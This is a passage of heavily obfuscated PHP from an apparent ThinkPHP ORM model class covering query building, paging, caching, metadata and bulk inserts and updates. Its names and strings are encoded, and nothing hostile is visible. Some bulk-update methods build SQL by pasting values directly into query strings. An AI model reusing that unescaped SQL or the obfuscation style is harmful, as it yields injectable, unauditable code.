$úìÛÑÁê = array_merge($úìÛÑÁê, $this->_scope[$Œ÷›Ø¸]); } if (!empty($Ëöş’ƒğ) && is_array($Ëöş’ƒğ)) { $úìÛÑÁê = array_merge($úìÛÑÁê, $Ëöş’ƒğ); } } elseif (is_array($ˆö®ƒéÒ)) { $úìÛÑÁê = $ˆö®ƒéÒ; } if (is_array($úìÛÑÁê) && !empty($úìÛÑÁê)) { $this->options = array_merge($this->options, array_change_key_case($úìÛÑÁê)); } return $this; } public function where($îªÜ´­¿, $§ºšáùğ = null) { $ÕÕåˆ‰‚ =& $_SERVER[†ûãı«°]; if (!is_null($§ºšáùğ) && is_string($îªÜ´­¿)) { if (!is_array($§ºšáùğ)) { $§ºšáùğ = func_get_args(); array_shift($§ºšáùğ); } $§ºšáùğ = array_map(array($this->db, $ÕÕåˆ‰‚[420]), $§ºšáùğ); $îªÜ´­¿ = vsprintf($îªÜ´­¿, $§ºšáùğ); } elseif (is_object($îªÜ´­¿)) { $îªÜ´­¿ = get_object_vars($îªÜ´­¿); } elseif (is_array($îªÜ´­¿)) { foreach ($îªÜ´­¿ as $µ€âÃûş => $À¯‹ğ³‘) { if ((is_numeric($µ€âÃûş) || !$µ€âÃûş) && is_string($À¯‹ğ³‘)) { if (strpos($À¯‹ğ³‘, $ÕÕåˆ‰‚[427]) === 0) { continue; } think_trace($ÕÕåˆ‰‚[428], $ÕÕåˆ‰‚[12], $ÕÕåˆ‰‚[49]); die; } } } if (is_string($îªÜ´­¿) && $ÕÕåˆ‰‚[12] != $îªÜ´­¿) { $Ø§î³ = array(); $Ø§î³[$ÕÕåˆ‰‚[429]] = $îªÜ´­¿; $îªÜ´­¿ = $Ø§î³; } if (isset($this->options[$ÕÕåˆ‰‚[354]])) { $this->options[$ÕÕåˆ‰‚[354]] = array_merge($this->options[$ÕÕåˆ‰‚[354]], $îªÜ´­¿); } else { $this->options[$ÕÕåˆ‰‚[354]] = $îªÜ´­¿; } return $this; } public function limit($¦‚—ô, $³„ºÔå = null) { $èøÖí÷ì =& $_SERVER[†ûãı«°]; $this->options[$èøÖí÷ì[369]] = is_null($³„ºÔå) ? $¦‚—ô : $¦‚—ô . $èøÖí÷ì[50] . $³„ºÔå; return $this; } public function page($Ğúğ‡Œ, $Ñœ—ºÁÕ = null) { $ŠÆ½Æ¸‹ =& $_SERVER[†ûãı«°]; $this->options[$ŠÆ½Æ¸‹[430]] = is_null($Ñœ—ºÁÕ) ? $Ğúğ‡Œ : $Ğúğ‡Œ . $ŠÆ½Æ¸‹[50] . $Ñœ—ºÁÕ; return $this; } public function comment($”éŠ‹Î¡) { $this->options[$_SERVER[†ûãı«°][431]] = $”éŠ‹Î¡; return $this; } public function setProperty($èô¥ÅŸè, $¢ÄÆÖ¥Ö) { if (property_exists($this, $èô¥ÅŸè)) { $this->{$èô¥ÅŸè} = $¢ÄÆÖ¥Ö; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\x66\171\x54\151\155\145", "\164\151\x6d\x65", "\x69\x6e\163\145\162\x74\54\x75\x70\x64\141\164\x65", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\x63\162\145\141\164\145\124\x69\155\145", "\x74\x69\155\145", "\151\156\163\145\162\x74", "\146\x75\156\x63\x74\x69\x6f\x6e")); public function setDataAuto($õª£†÷) { $this->dataAuto = $õª£†÷; } public function __construct($Ñäé®øÊ = '', $•Æ¶ë¥± = '', $¹¸İúì» = '') { parent::__construct($Ñäé®øÊ, $•Æ¶ë¥±, $¹¸İúì»); } protected $tableMeta = array(); protected function _beforeInsert(&$ëëÛèû, $ìŸ¥Š¤) { $°ï‹‚™ü =& $_SERVER[†ûãı«°]; if (!$this->checkDataAutoHas($°ï‹‚™ü[432])) { return; } $this->dataBeforeFilter($ëëÛèû, $°ï‹‚™ü[432]); } protected function _beforeUpdate(&$œï×ËÑ®, $Âøä«à×) { $„ùÏú—¼ =& $_SERVER[†ûãı«°]; if (!$this->checkDataAutoHas($„ùÏú—¼[433])) { return; } $this->dataBeforeFilter($œï×ËÑ®, $„ùÏú—¼[433]); } protected function _afterSelect(&$ÀÛİŒµí, $×òß’§“) { if (!is_array($ÀÛİŒµí)) { return; } if (!$this->checkDataAutoHas($_SERVER[†ûãı«°][434])) { return; } foreach ($ÀÛİŒµí as &$çÕ—ûŒ¤) { $this->dataAfterFilter($çÕ—ûŒ¤); } unset($çÕ—ûŒ¤); } protected function _afterFind(&$Ÿç®«ô©, $û¸Üœæ‚) { if (!is_array($Ÿç®«ô©)) { return; } if (!$this->checkDataAutoHas($_SERVER[†ûãı«°][434])) { return; } $this->dataAfterFilter($Ÿç®«ô©); } public static function textEncode($ÈÌùøï‘) { if (!$ÈÌùøï‘) { return $ÈÌùøï‘; } $ äŠÄ¡Õ = json_encode($ÈÌùøï‘); $ äŠÄ¡Õ = preg_replace_callback($_SERVER[†ûãı«°][435], function ($äÎÉÖ·ü) { return addslashes($äÎÉÖ·ü[0]); }, $ äŠÄ¡Õ); return json_decode($ äŠÄ¡Õ); } public static function textDecode($èÎü››) { $†¾ô±Şë =& $_SERVER[†ûãı«°]; $÷àìµçÚ = json_encode($èÎü››); $÷àìµçÚ = preg_replace_callback($†¾ô±Şë[436], function ($ãŠŸğ‡«) { return $_SERVER[†ûãı«°][100]; }, $÷àìµçÚ); return json_decode($÷àìµçÚ); } public function setAutoIncrement($å£ŒÃğ¦) { $óµ¦ş’• = array($this->getPk() => $å£ŒÃğ¦); $‘Õï·ñİ = $this->data($óµ¦ş’•)->add(); if ($‘Õï·ñİ) { $this->delete($‘Õï·ñİ); } } public function getAutoIncrement() { $³Œ°«± = $this->getTableName(); $ˆèÛÇø = $this->max($this->getPk()); $È¢ÒâÅá = $this->query("\163\150\157\167\40\x74\x61\x62\154\145\x20\163\x74\x61\x74\x75\163\x20\x77\x68\145\x72\145\40\x4e\x61\x6d\x65\x3d\47{$³Œ°«±}\x27"); $³¸ù†Ê¸ = $È¢ÒâÅá[0][$_SERVER[†ûãı«°][437]]; $çáÍ²Ï© = max($ˆèÛÇø, $³¸ù†Ê¸); return $çáÍ²Ï©; } protected function _callBefore($­ß×ş×ı, $ì°ñÏşë) { return $this->cacheCallCheck($­ß×ş×ı, $ì°ñÏşë, !1); } protected function _callAfter($¦ÑÍºúê, $Ùœß§®Š) { return $this->cacheCallCheck($¦ÑÍºúê, $Ùœß§®Š, !0); } protected function cacheFunctionAlias($©âäÑÙö) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ËÛ¼á‡ï, $½ûëç¦Ş, $ØòŞÕï = false) { $Ç„‡Ä±¤ =& $_SERVER[†ûãı«°]; $ó—ßÚÈ† = $this->cacheFunctionAlias($½ûëç¦Ş); if (!$ó—ßÚÈ†) { return; } foreach ($ó—ßÚÈ† as $ğ­×¸³‹ => $¾ÍÒû¥») { $îÀË©‰ï = $¾ÍÒû¥»[0]; $ßíÛóÊõ = explode($Ç„‡Ä±¤[50], $¾ÍÒû¥»[1]); $¨›ıõ˜ª = isset($¾ÍÒû¥»[2]) ? $¾ÍÒû¥»[2] : $Ç„‡Ä±¤[12]; if ($ËÛ¼á‡ï == $ğ­×¸³‹) { return $this->cacheFunctionGet($ğ­×¸³‹, $îÀË©‰ï, $¨›ıõ˜ª); } if ($ØòŞÕï && in_array($ËÛ¼á‡ï, $ßíÛóÊõ)) { $this->cacheFunctionClear($ğ­×¸³‹, $îÀË©‰ï, $¨›ıõ˜ª); } } } public function cacheFunctionGet($ÇîÒÅ å, $Û¦Ó†Äï, $ÏŞ”œ¼ = '') { $®ÔÓÅ¼é = $this->cacheKeyMake($ÇîÒÅ å, $Û¦Ó†Äï, $ÏŞ”œ¼); $ù”°¶¸‰ = Cache::get($®ÔÓÅ¼é); if (!is_array($ù”°¶¸‰)) { $ù”°¶¸‰ = call_user_func_array(array($this, $ÇîÒÅ å), array($Û¦Ó†Äï, !0)); Cache::set($®ÔÓÅ¼é, $ù”°¶¸‰); } return $ù”°¶¸‰; } public function cacheFunctionClear($Ã„½èµ, $ãñ§¶Î˜, $•á£Ü• = '') { $™ß”¬ù› = $ãñ§¶Î˜; if (!is_array($ãñ§¶Î˜)) { $™ß”¬ù› = array($ãñ§¶Î˜); } foreach ($™ß”¬ù› as $Š÷•©™†) { $«òÀÕ«µ = $this->cacheKeyMake($Ã„½èµ, $Š÷•©™†, $•á£Ü•); Cache::remove($«òÀÕ«µ); } } public function cacheKeyMake($¯©Û´, $ª¬Ö•, $şş²·ÉÓ) { $ÖÌûèÕ =& $_SERVER[†ûãı«°]; if ($şş²·ÉÓ) { $ª¬Ö• = $ª¬Ö• . $ÖÌûèÕ[438] . $şş²·ÉÓ; } return get_class($this) . $ÖÌûèÕ[11] . $¯©Û´ . $ÖÌûèÕ[439] . $ª¬Ö•; } protected function selectPageReset() { $‘Ÿ„õ‰è =& $_SERVER[†ûãı«°]; if (isset($GLOBALS[$‘Ÿ„õ‰è[440]])) { return; } $GLOBALS[$‘Ÿ„õ‰è[440]] = isset($GLOBALS[$‘Ÿ„õ‰è[7]][$‘Ÿ„õ‰è[441]]) ? $GLOBALS[$‘Ÿ„õ‰è[7]][$‘Ÿ„õ‰è[441]] : !1; $GLOBALS[$‘Ÿ„õ‰è[442]] = isset($GLOBALS[$‘Ÿ„õ‰è[7]][$‘Ÿ„õ‰è[430]]) ? $GLOBALS[$‘Ÿ„õ‰è[7]][$‘Ÿ„õ‰è[430]] : !1; $GLOBALS[$‘Ÿ„õ‰è[7]][$‘Ÿ„õ‰è[441]] = !1; $GLOBALS[$‘Ÿ„õ‰è[7]][$‘Ÿ„õ‰è[430]] = !1; } protected function selectPageRestore() { $ÍğÜâ½ =& $_SERVER[†ûãı«°]; if (!isset($GLOBALS[$ÍğÜâ½[440]])) { return; } $GLOBALS[$ÍğÜâ½[7]][$ÍğÜâ½[441]] = $GLOBALS[$ÍğÜâ½[440]]; $GLOBALS[$ÍğÜâ½[7]][$ÍğÜâ½[430]] = $GLOBALS[$ÍğÜâ½[442]]; if ($GLOBALS[$ÍğÜâ½[7]][$ÍğÜâ½[441]] === !1) { unset($GLOBALS[$ÍğÜâ½[7]][$ÍğÜâ½[441]]); } if ($GLOBALS[$ÍğÜâ½[7]][$ÍğÜâ½[430]] === !1) { unset($GLOBALS[$ÍğÜâ½[7]][$ÍğÜâ½[430]]); } unset($GLOBALS[$ÍğÜâ½[440]]); unset($GLOBALS[$ÍğÜâ½[442]]); } protected function selectPage($¶îäŞÖ„ = 200, $äß„ƒ„Ş = 1) { $»ğÌ»ä¡ =& $_SERVER[†ûãı«°]; global $in; $°œí³Æá = $this->optionsValue(); $ÄƒÇ’¹„ = 50000; $¶îäŞÖ„ = isset($in[$»ğÌ»ä¡[441]]) && $in[$»ğÌ»ä¡[441]] ? $in[$»ğÌ»ä¡[441]] : $¶îäŞÖ„; if ($¶îäŞÖ„ === -1) { $in[$»ğÌ»ä¡[441]] = !1; $ÄƒÇ’¹„ = 100000000; $¶îäŞÖ„ = $ÄƒÇ’¹„; } $å•ĞÔŒ¿ = $°œí³Æá; $å•ĞÔŒ¿[$»ğÌ»ä¡[443]] = array(); $¶îäŞÖ„ = intval($¶îäŞÖ„); $¶îäŞÖ„ = $¶îäŞÖ„ <= 5 ? 5 : ($¶îäŞÖ„ >= $ÄƒÇ’¹„ ? $ÄƒÇ’¹„ : $¶îäŞÖ„); $äß„ƒ„Ş = intval(isset($in[$»ğÌ»ä¡[430]]) && $in[$»ğÌ»ä¡[430]] ? $in[$»ğÌ»ä¡[430]] : $äß„ƒ„Ş); $äß„ƒ„Ş = $äß„ƒ„Ş <= 1 ? 1 : $äß„ƒ„Ş; $¤ì³‡¯ = array(); $øÚ‹º˜ò = 1; if ($äß„ƒ„Ş == 1 && $øÚ‹º˜ò) { $this->optionsValue($°œí³Æá); $¤ì³‡¯ = $this->page($äß„ƒ„Ş, $¶îäŞÖ„)->select(); $é‹‡·Ğä = is_array($¤ì³‡¯) ? count($¤ì³‡¯) : 0; if ($é‹‡·Ğä < $¶îäŞÖ„) { $¨æ…èÍ® = 1; } else { $this->optionsValue($å•ĞÔŒ¿); $é‹‡·Ğä = intval($this->count()); $¨æ…èÍ® = ceil($é‹‡·Ğä / $¶îäŞÖ„); } } else { $this->optionsValue($å•ĞÔŒ¿); $é‹‡·Ğä = intval($this->count()); $¨æ…èÍ® = ceil($é‹‡·Ğä / $¶îäŞÖ„); $äß„ƒ„Ş = $äß„ƒ„Ş >= $¨æ…èÍ® ? $¨æ…èÍ® : $äß„ƒ„Ş; $this->optionsValue($°œí³Æá); $¤ì³‡¯ = $this->page($äß„ƒ„Ş, $¶îäŞÖ„)->select(); } if (!is_array($¤ì³‡¯)) { $¤ì³‡¯ = array(); } if ($¨æ…èÍ® == 1) { $é‹‡·Ğä = count($¤ì³‡¯); } $†”ÍãÌ = array($»ğÌ»ä¡[444] => array($»ğÌ»ä¡[445] => $é‹‡·Ğä, $»ğÌ»ä¡[441] => $¶îäŞÖ„, $»ğÌ»ä¡[430] => $äß„ƒ„Ş, $»ğÌ»ä¡[446] => $¨æ…èÍ®), $»ğÌ»ä¡[447] => $¤ì³‡¯); return $†”ÍãÌ; } protected function checkLength($”¥‚ÎÍ€, $¾µÌãÀ = 0, $âú÷Ü¹ = '') { $Å‰Á˜ãˆ =& $_SERVER[†ûãı«°]; $¾µÌãÀ = $¾µÌãÀ ? $¾µÌãÀ : 65536; if (!$”¥‚ÎÍ€ || strlen($”¥‚ÎÍ€) < $¾µÌãÀ) { return; } $âú÷Ü¹ = $âú÷Ü¹ ? $âú÷Ü¹ . $Å‰Á˜ãˆ[74] : $Å‰Á˜ãˆ[12]; show_json($âú÷Ü¹ . LNG($Å‰Á˜ãˆ[448]) . "\x28{$¾µÌãÀ}\x29", !1); } protected function metaSet($âçÏ–ÅÚ, $·…÷Öõö = null, $¤°¼±¼ = null) { $ïñ«ûÄ¥ =& $_SERVER[†ûãı«°]; if (!$this->tableMeta || !$âçÏ–ÅÚ) { return !1; } $íúÉ¶Ö = $this->tableMeta[$ïñ«ûÄ¥[449]]; $Ø–ÛÎëƒ = $this->tableMeta[$ïñ«ûÄ¥[450]]; $Û¢Ê¼Æú = Model($Ø–ÛÎëƒ); $®äü£«û = array($íúÉ¶Ö => $âçÏ–ÅÚ, $ïñ«ûÄ¥[451] => $·…÷Öõö); if (is_null($·…÷Öõö)) { return $Û¢Ê¼Æú->where(array($íúÉ¶Ö => $âçÏ–ÅÚ))->delete(); } if (is_null($¤°¼±¼) && is_string($·…÷Öõö)) { return $Û¢Ê¼Æú->where($®äü£«û)->delete(); } $Õ»¼Ÿ¡ = is_array($·…÷Öõö) ? $·…÷Öõö : array(); if (is_string($·…÷Öõö)) { $Õ»¼Ÿ¡[$·…÷Öõö] = $¤°¼±¼; } $ë¹½À±‚ = array(); foreach ($Õ»¼Ÿ¡ as $œ¥¹ş‰ => $¯íËÏ) { if (is_null($¯íËÏ) && is_string($œ¥¹ş‰)) { $Û¢Ê¼Æú->where(array($íúÉ¶Ö => $âçÏ–ÅÚ, $ïñ«ûÄ¥[451] => $œ¥¹ş‰))->delete(); continue; } $this->checkLength($¯íËÏ, !1, $Ø–ÛÎëƒ . $ïñ«ûÄ¥[4] . $œ¥¹ş‰); $ë¹½À±‚[] = array($íúÉ¶Ö => $âçÏ–ÅÚ, $ïñ«ûÄ¥[97] => $œ¥¹ş‰, $ïñ«ûÄ¥[452] => $¯íËÏ); } $ÊÍ®àÄÜ = $ïñ«ûÄ¥[453] . $Ø–ÛÎëƒ; CacheLock::lock($ÊÍ®àÄÜ); $Û¢Ê¼Æú->where(array($íúÉ¶Ö => $âçÏ–ÅÚ))->addAll($ë¹½À±‚, array(), !0); CacheLock::unlock($ÊÍ®àÄÜ); return !0; } public function metaGet($¦æ³ì¢, $ÊÛÎ–ÉÊ = false) { $›§°³Òˆ =& $_SERVER[†ûãı«°]; if (!$this->tableMeta) { return array(); } $ÓÍË¯ã = $this->tableMeta[$›§°³Òˆ[449]]; $–£×ÅÒï = Model($this->tableMeta[$›§°³Òˆ[450]]); if ($ÊÛÎ–ÉÊ) { $°áæ¶Ç¾ = array($ÓÍË¯ã => $¦æ³ì¢, $›§°³Òˆ[97] => $ÊÛÎ–ÉÊ); return $–£×ÅÒï->where($°áæ¶Ç¾)->getField($›§°³Òˆ[452]); } $°áæ¶Ç¾ = array($ÓÍË¯ã => $¦æ³ì¢); $ÊÏ¹Ãšœ = $–£×ÅÒï->field($›§°³Òˆ[454])->where($°áæ¶Ç¾)->select(); $ÊÏ¹Ãšœ = array_to_keyvalue($ÊÏ¹Ãšœ, $›§°³Òˆ[97], $›§°³Òˆ[452]); return $ÊÏ¹Ãšœ; } private function checkDataAutoHas($ïÅ§Æø‚) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ò½ƒºë°) { if (in_array($ïÅ§Æø‚, explode($_SERVER[†ûãı«°][50], $Ò½ƒºë°[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$µ¡ÆÁ±€, $Õ˜×èøÇ) { $·¥¦ÈİÚ =& $_SERVER[†ûãı«°]; if (!is_array($µ¡ÆÁ±€)) { return; } foreach ($this->dataAuto as $íßØª™) { $­˜Æ÷ = $íßØª™[0]; if (!in_array($Õ˜×èøÇ, explode($·¥¦ÈİÚ[50], $íßØª™[2]))) { continue; } switch (trim($íßØª™[3])) { case $·¥¦ÈİÚ[398]: case $·¥¦ÈİÚ[399]: $¨°½ûò› = $íßØª™[1]; $ö”ŒÄ³ = isset($íßØª™[4]) ? (array) $íßØª™[4] : array(); if ($¨°½ûò› == $·¥¦ÈİÚ[206] && array_key_exists($­˜Æ÷, $µ¡ÆÁ±€)) { if (!$µ¡ÆÁ±€[$­˜Æ÷]) { unset($µ¡ÆÁ±€[$­˜Æ÷]); } break; } if (isset($µ¡ÆÁ±€[$­˜Æ÷])) { array_unshift($ö”ŒÄ³, $µ¡ÆÁ±€[$­˜Æ÷]); } if ($·¥¦ÈİÚ[398] == $íßØª™[3]) { $µ¡ÆÁ±€[$­˜Æ÷] = call_user_func_array($¨°½ûò›, $ö”ŒÄ³); } else { $µ¡ÆÁ±€[$­˜Æ÷] = call_user_func_array(array(&$this, $¨°½ûò›), $ö”ŒÄ³); } break; case $·¥¦ÈİÚ[349]: if (isset($µ¡ÆÁ±€[$­˜Æ÷]) && $µ¡ÆÁ±€[$­˜Æ÷]) { $µ¡ÆÁ±€[$­˜Æ÷] = call_user_func_array(array(&$this, $íßØª™[1]), array($µ¡ÆÁ±€[$­˜Æ÷])); } break; case $·¥¦ÈİÚ[352]: $µ¡ÆÁ±€[$­˜Æ÷] = $µ¡ÆÁ±€[$íßØª™[1]]; break; case $·¥¦ÈİÚ[371]: if (isset($µ¡ÆÁ±€[$­˜Æ÷]) && !is_string($µ¡ÆÁ±€[$­˜Æ÷])) { $µ¡ÆÁ±€[$­˜Æ÷] = json_encode_force($µ¡ÆÁ±€[$­˜Æ÷]); } break; case $·¥¦ÈİÚ[400]: if ($µ¡ÆÁ±€[$­˜Æ÷] === $·¥¦ÈİÚ[12]) { unset($µ¡ÆÁ±€[$­˜Æ÷]); } break; case $·¥¦ÈİÚ[401]: $µ¡ÆÁ±€[$­˜Æ÷] = $íßØª™[1]; default: break; } } if ($Õ˜×èøÇ == $·¥¦ÈİÚ[432]) { $áªÀ¹è = strtolower($this->db->getDbType()); if (strpos($áªÀ¹è, $·¥¦ÈİÚ[13]) !== 0) { return; } $ªÖ‹¿àÍ = $this->field(!0)->fields; $’§İ‚±î = $ªÖ‹¿àÍ[$·¥¦ÈİÚ[331]]; if (isset($ªÖ‹¿àÍ[$·¥¦ÈİÚ[330]])) { unset($’§İ‚±î[$ªÖ‹¿àÍ[$·¥¦ÈİÚ[330]]]); } foreach ($’§İ‚±î as $—¹ó‡ó => $Õ˜×èøÇ) { if (!isset($µ¡ÆÁ±€[$—¹ó‡ó])) { $µ¡ÆÁ±€[$—¹ó‡ó] = $·¥¦ÈİÚ[12]; } } } } private function dataAfterFilter(&$„×Ç³Èæ) { $¹–¡îéÂ =& $_SERVER[†ûãı«°]; foreach ($this->dataAuto as $ÖâÒáÉÙ) { $×™•îáÙ = $ÖâÒáÉÙ[0]; if (!isset($„×Ç³Èæ[$×™•îáÙ])) { continue; } if (!in_array($¹–¡îéÂ[434], explode($¹–¡îéÂ[50], $ÖâÒáÉÙ[2]))) { continue; } switch (trim($ÖâÒáÉÙ[3])) { case $¹–¡îéÂ[398]: case $¹–¡îéÂ[399]: $‰ıÖ˜ş = isset($ÖâÒáÉÙ[4]) ? (array) $ÖâÒáÉÙ[4] : array(); array_unshift($‰ıÖ˜ş, $„×Ç³Èæ[$×™•îáÙ]); if (isset($ÖâÒáÉÙ[4]) && $ÖâÒáÉÙ[4] == $¹–¡îéÂ[455]) { $‰ıÖ˜ş = array($„×Ç³Èæ[$×™•îáÙ]); } if ($¹–¡îéÂ[398] == $ÖâÒáÉÙ[3]) { $„×Ç³Èæ[$×™•îáÙ] = call_user_func_array($ÖâÒáÉÙ[1], $‰ıÖ˜ş); } else { $„×Ç³Èæ[$×™•îáÙ] = call_user_func_array(array(&$this, $ÖâÒáÉÙ[1]), $‰ıÖ˜ş); } break; case $¹–¡îéÂ[349]: if (isset($„×Ç³Èæ[$×™•îáÙ]) && $„×Ç³Èæ[$×™•îáÙ]) { $„×Ç³Èæ[$×™•îáÙ] = call_user_func_array(array(&$this, $ÖâÒáÉÙ[1]), array($„×Ç³Èæ[$×™•îáÙ])); } break; case $¹–¡îéÂ[352]: $„×Ç³Èæ[$×™•îáÙ] = $„×Ç³Èæ[$ÖâÒáÉÙ[1]]; break; case $¹–¡îéÂ[371]: $ÀÖ¬îşŸ = $„×Ç³Èæ[$×™•îáÙ]; $„×Ç³Èæ[$×™•îáÙ] = json_decode($ÀÖ¬îşŸ, !0); if (is_null($„×Ç³Èæ[$×™•îáÙ])) { $„×Ç³Èæ[$×™•îáÙ] = $ÀÖ¬îşŸ; } break; case $¹–¡îéÂ[400]: if ($„×Ç³Èæ[$×™•îáÙ] === $¹–¡îéÂ[12]) { unset($„×Ç³Èæ[$×™•îáÙ]); } break; case $¹–¡îéÂ[401]: $„×Ç³Èæ[$×™•îáÙ] = $ÖâÒáÉÙ[1]; break; default: break; } } } public function saveAll($’á­Â­) { $ÇÃé¦¡ =& $_SERVER[†ûãı«°]; $àÖâ·ßê = $this->tablePrefix . $this->tableName; $óõçõ•î = self::SQL_WHERE_IN_CHUNK; $’á­Â­ = is_array($’á­Â­) ? $’á­Â­ : array(); $Îï¡Œè¤ = $ÇÃé¦¡[456]; $ñ„¬ÀŠÏ = 0; $×¢åÉı = array(); $İ°¨‘¿œ = count($’á­Â­); for ($Ø‘çË™ = 0; $Ø‘çË™ < $İ°¨‘¿œ; $Ø‘çË™++) { $½İ‚¨º = $’á­Â­[$Ø‘çË™]; if (!is_array($½İ‚¨º) || count($½İ‚¨º) != 4) { continue; } $†ºÓ–ÑŞ = "\x55\120\x44\101\x54\x45\40\140{$àÖâ·ßê}\140\40\x53\x45\124\40{$½İ‚¨º[2]}\40\x3d\40\103\101\x53\x45\x20{$½İ‚¨º[0]}\40\xa"; if ($ñ„¬ÀŠÏ == 0) { $Îï¡Œè¤ = $†ºÓ–ÑŞ; } $×¢åÉı[] = $ÇÃé¦¡[121] . $½İ‚¨º[1] . $ÇÃé¦¡[121]; $ñ„¬ÀŠÏ++; $Îï¡Œè¤ .= "\40\127\x48\x45\x4e\40\x27{$½İ‚¨º[1]}\47\40\124\x48\x45\x4e\x20\x27{$½İ‚¨º[3]}\47\40\xa"; if ($ñ„¬ÀŠÏ == $óõçõ•î || $Ø‘çË™ == $İ°¨‘¿œ - 1) { $¡…¹•ù´ = implode($ÇÃé¦¡[50], $×¢åÉı); $Îï¡Œè¤ .= "\x20\105\116\104\40\40\127\x48\105\122\105\x20{$½İ‚¨º[0]}\40\x49\x4e\x20\50{$¡…¹•ù´}\51\x20"; $this->execute($Îï¡Œè¤); $ñ„¬ÀŠÏ = 0; $Îï¡Œè¤ = $†ºÓ–ÑŞ; $this->chunkEventCheck(count($×¢åÉı)); $×¢åÉı = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ğ˜şŒáÕ) { $¿äËŒ‘± =& $_SERVER[†ûãı«°]; $œ²„ö˜ = $this->tablePrefix . $this->tableName; foreach ($Ğ˜şŒáÕ as $í£©¬‘ˆ) { if (!is_array($í£©¬‘ˆ) || count($í£©¬‘ˆ) != 4) { continue; } $Ş¦¨œãä = $í£©¬‘ˆ[0] . $¿äËŒ‘±[457] . $í£©¬‘ˆ[1] . $¿äËŒ‘±[121]; $âÔşš›¢ = $í£©¬‘ˆ[2] . $¿äËŒ‘±[457] . $í£©¬‘ˆ[3] . $¿äËŒ‘±[121]; $®ş° ÆŸ = "\x75\160\x64\141\164\x65\40{$œ²„ö˜}\40\x73\145\x74\x20{$âÔşš›¢}\40\x77\x68\145\162\145\40{$Ş¦¨œãä}\73"; $this->execute($®ş° ÆŸ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ïËñ™‘ = false, $¾³“«° = false) { $this->_chunkEvent = $ïËñ™‘; $this->_chunkEventParam = $¾³“«°; } private function chunkEventCheck($ªºÑ²¼›) { if (!$this->_chunkEvent) { return; } $ˆ·õœ”ğ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ˆ·õœ”ğ[$_SERVER[†ûãı«°][458]] = $ªºÑ²¼›; Hook::trigger($this->_chunkEvent, $ˆ·õœ”ğ); } public function addAll($üĞâ¦ÂÖ, $ÏÙ‡ùÊ = array(), $êóË®ò = false) { $è¸×ÙøŸ =& $_SERVER[†ûãı«°]; ignore_timeout(); $“êÒ²èÇ = self::SQL_WHERE_IN_CHUNK; if (empty($üĞâ¦ÂÖ)) { $this->error = think_lang($è¸×ÙøŸ[350]); return !1; } $ÏÙ‡ùÊ = $this->_parseOptions($ÏÙ‡ùÊ); foreach ($üĞâ¦ÂÖ as $çºáö => $ãËè™İü) { $üĞâ¦ÂÖ[$çºáö] = $this->_facade($ãËè™İü); $this->_beforeInsert($üĞâ¦ÂÖ[$çºáö], $ÏÙ‡ùÊ); } if (method_exists($this->db, $è¸×ÙøŸ[351])) { for ($®¿Ê˜õŒ = 0; $®¿Ê˜õŒ < count($üĞâ¦ÂÖ); $®¿Ê˜õŒ += $“êÒ²èÇ) { $¹Ùº·® = array_slice($üĞâ¦ÂÖ, $®¿Ê˜õŒ, $“êÒ²èÇ); if (!is_array($¹Ùº·®) || count($¹Ùº·®) == 0) { break; } $ç”¯íØ‘ = $this->db->insertAll($¹Ùº·®, $ÏÙ‡ùÊ, $êóË®ò); $this->chunkEventCheck(count($¹Ùº·®)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($üĞâ¦ÂÖ as $çºáö => $ãËè™İü) { $ç”¯íØ‘ = $this->db->insert($ãËè™İü, $ÏÙ‡ùÊ, $êóË®ò); } $this->commit(); } if (!1 !== $ç”¯íØ‘) { $ÍìÖúÛĞ = $this->getLastInsID(); if ($ÍìÖúÛĞ) { return $ÍìÖúÛĞ; } } return $ç”¯íØ‘; } public function save($ÅüÊ¶‡‹ = '', $áØ³Áî¤ = array()) { $ó···Æí =& $_SERVER[†ûãı«°]; $¯¾üİ°¾ = self::SQL_WHERE_IN_CHUNK; $ŠŸùÌºŠ = $this->optionsValue(); $Ù–Ù×ù = $this->findWhereField($ŠŸùÌºŠ); if (!$Ù–Ù×ù) { return parent::save($ÅüÊ¶‡‹, $áØ³Áî¤); } $óÊÁ²¨¯ = 0; $îÆ±®·· = $ŠŸùÌºŠ[$ó···Æí[354]][$Ù–Ù×ù][1]; $îÆ±®·· = is_array($îÆ±®··) ? $îÆ±®·· : array(); $¶Ä³œ¯ = count($îÆ±®··); for ($Ş§ÚŞÑÃ = 0; $Ş§ÚŞÑÃ < $¶Ä³œ¯; $Ş§ÚŞÑÃ += $¯¾üİ°¾) { $˜¢èÀ•Ÿ = array_slice($îÆ±®··, $Ş§ÚŞÑÃ, $¯¾üİ°¾); if (!is_array($˜¢èÀ•Ÿ) || count($˜¢èÀ•Ÿ) == 0) { break; } $ŠŸùÌºŠ[$ó···Æí[354]][$Ù–Ù×ù][1] = $˜¢èÀ•Ÿ; $this->optionsValue($ŠŸùÌºŠ); $óÊÁ²¨¯ += parent::save($ÅüÊ¶‡‹, $áØ³Áî¤); $this->chunkEventCheck(count($˜¢èÀ•Ÿ)); } $this->chunkEventSet(); return $óÊÁ²¨¯; } public function add($ÆÒßçâş = '', $¨Âƒ‰İ¿ = array(), $—®íéä“ = false) { if ($this->addTaskStatus && is_array($ÆÒßçâş)) { $this->addTaskData[] = $ÆÒßçâş; return; } return parent::add($ÆÒßçâş, $¨Âƒ‰İ¿, $—®íéä“); } public function parseWhereLike($°úÙ¼¹Ö, $¦…ˆ×” = '', $–ÃõÖıÚ = false, &$²ÆÕ¡‡† = false) { $–²û³©õ =& $_SERVER[†ûãı«°]; $Ó¡Ãß = $GLOBALS[$–²û³©õ[6]][$–²û³©õ[459]]; if (!$Ó¡Ãß[$–²û³©õ[460]]) { return $°úÙ¼¹Ö; } if (!is_array($°úÙ¼¹Ö)) { return $°úÙ¼¹Ö; } $Ğóºãµ = array(); $à˜ëœ® = 0; foreach ($°úÙ¼¹Ö as $¯ñÑ‡À” => $ÉçßÒìâ) { if (is_array($ÉçßÒìâ) && count($ÉçßÒìâ) == 2 && $ÉçßÒìâ[0] == $–²û³©õ[461] && is_string($ÉçßÒìâ[1]) && 